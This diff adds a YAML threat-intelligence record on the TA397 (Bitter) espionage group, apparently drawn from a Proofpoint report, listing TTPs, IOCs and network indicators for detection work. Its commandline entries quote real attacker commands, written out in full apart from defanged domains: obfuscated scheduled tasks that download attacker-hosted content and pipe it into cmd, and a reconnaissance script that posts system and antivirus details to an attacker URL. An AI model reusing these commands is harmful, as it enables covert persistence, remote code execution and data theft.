@@ -1,0 +1,90 @@
+description: Proofpoint Threat Research assesses it is highly likely that TA397 is
+  a state-backed threat actor tasked with intelligence gathering in the interests
+  of the Indian state. The group frequently experiments with their delivery methods
+  to load scheduled tasks.
+attribution: TA397 (Bitter), India-aligned
+malware_families:
+- wmRAT
+- MiyaRAT
+- KugelBlitz
+- Havoc C2 framework (Demon agent)
+TTPs:
+  processes:
+  - conhost.exe
+  - cmd.exe
+  - powershell.exe
+  - mmc.exe
+  - curl.exe
+  - wmic.exe
+  commandline:
+  - '"C:\\\\Windows\\\\System32\\\\conhost.exe" --headless cmd /c ping localhost >
+    nul & schtasks /create /tn "EdgeTaskUI" /f /sc minute /mo 16 /tr "conhost --headless
+    powershell -WindowStyle Minimized irm "woodstocktutors[.]com/jbc.php? fv=$env:COMPUTERNAME*$env:USERNAME"
+    -OutFile "C:\\\\Users\\\\public\\\\kwe.cc"; Get-Content "C:\\\\Users\\\\public\\\\kwe.cc"
+    | cmd"'
+  - schtasks /create /tn \\\\"Task-S-1-5-42121\\\\\\" /f /sc minute /mo 18 /tr \\\\"conhost
+    --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m&
+    c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d\\"
+  - '"C:\\\\Windows\\\\System32\\\\cmd.exe" /start min /c schtasks /create /tn "OneDrive\\\\OneDrive
+    Standalone Update Task-S-1-5-21-9920643986-2299988379" /f /sc minute /mo 19 /tr
+    "conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!&
+    set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%username%c^m^d"'
+  - '"C:\\\\Windows\\\\System32\\\\conhost.exe" --headless cmd /c ping localhost >
+    nul & schtasks /create /tn "MSTaskUI" /f /sc minute /mo 16 /tr "conhost --headless
+    powershell -WindowStyle Minimized irm "utizviewstation[.]com/sdf.php? fv=$env:COMPUTERNAME*$env:USERNAME"
+    -OutFile "C:\\\\Users\\\\public\\\\documents\\\\vfc.cc"; Get-Content "C:\\\\Users\\\\public\\\\documents\\\\vfc.cc"
+    | cmd"'
+  - tree "%userprofile%\\\\Desktop" /f > C:\\\\Users\\\\Public\\\\Documents\\\\d.log
+    systeminfo >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log WMIC /Node:localhost
+    /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState
+    /Format:List >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log wmic logicaldisk get
+    name >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log cd C:\\\\Users\\\\Public\\\\Documents
+    curl -X POST -F "file=@d.log" hxxps://www.utizviewstation[.]com/urf.php?mn=%computername%
+    del d.log
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: curl.exe
+    destination_address: 46.229.55[.]63
+    port: ''
+    url: hxxp://46.229.55[.]63/svch.php?li=%computername%..%username%
+  - executable: curl.exe
+    destination_address: 173.254.204[.]72
+    port: ''
+    url: hxxp://173.254.204[.]72/dune64.log
+  - executable: curl.exe
+    destination_address: 72.18.215[.]108
+    port: '443'
+    url: ''
+  - executable: curl.exe
+    destination_address: www.utizviewstation[.]com
+    port: ''
+    url: hxxps://www.utizviewstation[.]com/urf.php?mn=%computername%
+  file_activity:
+  - C:\\\\Users\\\\public\\\\kwe.cc
+  - C:\\\\Users\\\\public\\\\documents\\\\vfc.cc
+  - C:\\\\Users\\\\Public\\\\Documents\\\\d.log
+  - C:\\\\programdata
+  persistence:
+  - Scheduled Tasks
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: ''
+- ip: 46.229.55[.]63
+- domain: woodstocktutors[.]com
+- url: hxxp://46.229.55[.]63/svch.php?li=%computername%..%username%
+- ip: 173.254.204[.]72
+- domain: princecleanit[.]com
+- url: hxxps://www.utizviewstation[.]com/urf.php?mn=%computername%
+- ip: 72.18.215[.]108
+authors:
+- Nick Attfield
+- Konstantin Klinger
+- Abdallah Elshinbary
+- Jonas Wagner
+reference: https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one
+date_of_publication: June 04, 2025
+file_creation_date: June 05, 2025
